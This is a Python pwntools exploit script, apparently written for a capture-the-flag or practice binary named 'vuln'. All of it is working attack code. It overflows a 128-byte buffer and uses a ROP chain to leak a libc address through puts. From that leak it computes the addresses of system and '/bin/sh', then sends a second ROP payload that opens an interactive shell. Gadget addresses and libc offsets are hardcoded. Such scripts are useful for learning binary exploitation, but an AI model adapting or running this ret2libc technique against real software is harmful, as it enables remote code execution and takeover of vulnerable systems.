from pwn import *

#p = ELF('./vuln')
p = process('./vuln')

gdb.attach(p)

offset = 128
junk = b"A" * offset

pop_rdi = 0x400913
setbuf_at_got = 0x601028
puts_at_plt = 0x400540
back_to_main = 0x400771

payload = [
    junk,
    p64(pop_rdi), #ropper --file vuln --search "pop rdi"
    p64(setbuf_at_got),
    p64(puts_at_plt),
    p64(back_to_main),
]

payload = b"".join(payload)
p.sendline(payload)

p.recvline()
p.recvline()
print(p.recvline())
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")

setbuf_offset = 0x88540
base_address_of_libc = leak - setbuf_offset
log.info(f"{hex(base_address_of_libc)=}")

system_offset = 0x4F4E0
system_address = base_address_of_libc + system_offset

bin_sh_offset = 0x1B40FA
bin_sh_address = base_address_of_libc + bin_sh_offset

ret_instruction = 0x40052E

second_payload = [
    junk,
    p64(pop_rdi),
    p64(bin_sh_address),
    p64(ret_instruction),
    p64(system_address),
]

second_payload = b"".join(second_payload)
p.sendline(second_payload)

p.interactive()